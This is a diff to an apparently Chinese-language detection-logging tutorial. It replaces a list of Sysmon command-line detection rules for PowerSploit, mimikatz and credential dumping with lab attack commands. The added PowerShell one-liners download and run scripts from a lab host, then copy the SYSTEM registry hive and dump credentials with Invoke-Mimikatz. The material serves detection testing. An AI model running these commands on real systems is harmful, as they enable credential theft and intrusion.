@@ -312,24 +312,16 @@ output {
 
 
 
-我们挑部分规则测试一下
+我们使用 PowerSploit 干一下
 
 ```bash
-<CommandLine name="Alert=Hacking Command Line events,Tactic=Privilege Escalation" condition="contains">Invoke-DllInjection</CommandLine>
-<CommandLine name="Alert=Hacking Command Line events,Tactic=Privilege Escalation" condition="contains">Invoke-Shellcode</CommandLine>
-<CommandLine name="Alert=Hacking Command Line events,Tactic=Privilege Escalation" condition="contains">Invoke-WmiCommand</CommandLine>
-<CommandLine name="MitreRef=T1003,Technique=Credential Dumping,Tactic=Credential Access,Alert=Hacking Command Line events,Tactic=Privilege Escalation" condition="contains">Get-GPPPassword</CommandLine>
-<CommandLine name="Alert=Hacking Command Line events,Tactic=Privilege Escalation" condition="contains">Get-Keystrokes</CommandLine>
-<CommandLine name="Alert=Hacking Command Line events,Tactic=Privilege Escalation" condition="contains">Get-TimedScreenshot</CommandLine>
-<CommandLine name="MitreRef=T1003,Technique=Credential Dumping,Tactic=Credential Access,Alert=Hacking Command Line events,Tactic=Privilege Escalation" condition="contains">Get-VaultCredential</CommandLine>
-<CommandLine name="Alert=Hacking Command Line events,Tactic=Privilege Escalation" condition="contains">Invoke-CredentialInjection</CommandLine>
-<CommandLine name="MitreRef=T1003,Technique=Credential Dumping,Tactic=Credential Access,Alert=Hacking Command Line events,Tactic=Privilege Escalation" condition="contains">mimikatz</CommandLine>
-<CommandLine name="Alert=Hacking Command Line events,Tactic=Privilege Escalation" condition="contains">Invoke-NinjaCopy</CommandLine>
-<CommandLine name="Alert=Hacking Command Line events,Tactic=Privilege Escalation" condition="contains">Invoke-TokenManipulation</CommandLine>
-<CommandLine name="Alert=Hacking Command Line events,Tactic=Privilege Escalation" condition="contains">Out-Minidump</CommandLine>
-<CommandLine name="Alert=Hacking Command Line events,Tactic=Privilege Escalation" condition="contains">VolumeShadowCopyTools</CommandLine>
-<CommandLine name="Alert=Hacking Command Line events,Tactic=Privilege Escalation" condition="contains">Invoke-ReflectivePEInjection</CommandLine>
-<CommandLine name="Alert=Hacking Command Line events,Tactic=Privilege Escalation" condition="contains">Invoke-UserHunter</CommandLine>
+https://github.com/mattifestation/PowerSploit.git
+```
+
+```bash
+powershell IEX (New-Object System.Net.Webclient).DownloadString(\"http://172.16.251.133/Exfiltration/Invoke-NinjaCopy.ps1\");Invoke-NinjaCopy  -Path   C:\Windows\System32\config\SYSTEM -LocalDestination .\system.hive
+
+powershell IEX (New-Object System.Net.Webclient).DownloadString(\"http://172.16.251.133/Exfiltration/Invoke-Mimikatz.ps1\");Invoke-Mimikatz   -DumpCreds 
 
 ```
 
